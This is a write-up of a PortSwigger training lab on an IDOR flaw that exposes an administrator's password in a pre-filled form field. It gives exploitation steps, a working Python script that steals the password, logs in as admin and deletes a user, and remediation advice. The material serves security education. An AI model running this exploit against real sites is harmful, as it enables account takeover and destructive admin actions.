# IDOR — Retrieving Admin Password via Pre-Filled Form Field — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-08-03

## The Problem

Like labs 7–9, the account page (`/my-account?id=...`) returned another user's data based on a client-supplied `id` parameter with no real authorization check. This time, the leaked data was especially severe: the account page pre-filled a password change form with the target user's **current password** as the field's `value` attribute — meaning requesting the `administrator` account directly exposed the admin's actual password in the page's HTML.

## Discovery / Exploitation

1. Log in as a normal user (`wiener` / `peter`)
2. Request `/my-account?id=administrator` instead of the logged-in user's own id
3. The server returns the administrator's account page, including a password-change form whose `<input name="password">` field is pre-filled with the admin's real current password
4. Extract that password directly from the page's HTML
5. Log in as `administrator` using the leaked password, gaining full admin access
6. Use the now-legitimate admin session to perform privileged actions (e.g. deleting another user, `carlos`)

## Impact

This is a critical, complete account takeover of the administrator account — not just viewing another user's data, but obtaining full working credentials for the highest-privileged account in the application. Once escalated, an attacker has unrestricted access to every admin function.

## Proof of Concept (Python)

This script logs in as the low-privileged user, requests the administrator's account page via the IDOR, extracts the admin's password from the pre-filled form field, logs in as the administrator with the stolen credentials, and deletes another user to confirm full admin access.

```python
import requests
import re
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def retrieve_admin_password(s, url):
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    print("(+) logging in as wiener user...")
    data_login = {'csrf': csrf_token, "username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text

    if "logout" in res:
        print("(+) successfully logged in as wiener user")

        admin_account_url = url + "/my-account?id=administrator"
        r = s.get(admin_account_url, verify=False, proxies=proxies)
        res = r.text

        if 'administrator' in res:
            print("(+) successfully accessed admin account....")
            print("(+) retrieving administrator password....")

            soup = BeautifulSoup(res, 'html.parser')
            password = soup.find("input", {'name': 'password'})['value']
            return password
        else:
            print("(-) could not access admin account")
            sys.exit(-1)
    else:
        print("(-) could not log in...")
        sys.exit(-1)


def delete_carlos_user(s, url, admin_password):
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    print("(+) logging in as administrator user...")
    data_login = {'csrf': csrf_token, "username": "administrator", "password": admin_password}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text

    if "logout" in res:
        print("(+) successfully logged in as administrator user")
        print("(+) deleting carlos user")

        deleting_carlos_url = url + "/admin/delete?username=carlos"
        r = s.get(deleting_carlos_url, verify=False, proxies=proxies)

        if r.status_code == 200:
            print("(+) successfully deleted...")
        else:
            print("(-) could not delete carlos user...")
            sys.exit(-1)
    else:
        print("(-) could not log in as administrator user...")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    admin_password = retrieve_admin_password(s, url)

    s = requests.Session()
    delete_carlos_user(s, url, admin_password)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Logs in as `wiener` and requests `/my-account?id=administrator` via the same IDOR pattern seen in earlier labs
2. Parses the returned HTML and extracts the `value` of the password input field — the admin's real, current password
3. Opens a fresh session and logs in directly as `administrator` using the stolen password
4. Uses the legitimate admin session to delete another user, confirming full administrative access was achieved

## Remediation

Two separate fixes are required here:
1. **Fix the IDOR** — the server must verify that the requested `id` matches the authenticated user's own identity before returning any account data, exactly as in labs 7–9
2. **Never pre-fill a password field with the user's actual current password** — password fields should always be left blank in forms, even for the account's legitimate owner. Displaying a real password back to the client at all is an unnecessary and dangerous practice, regardless of access control.
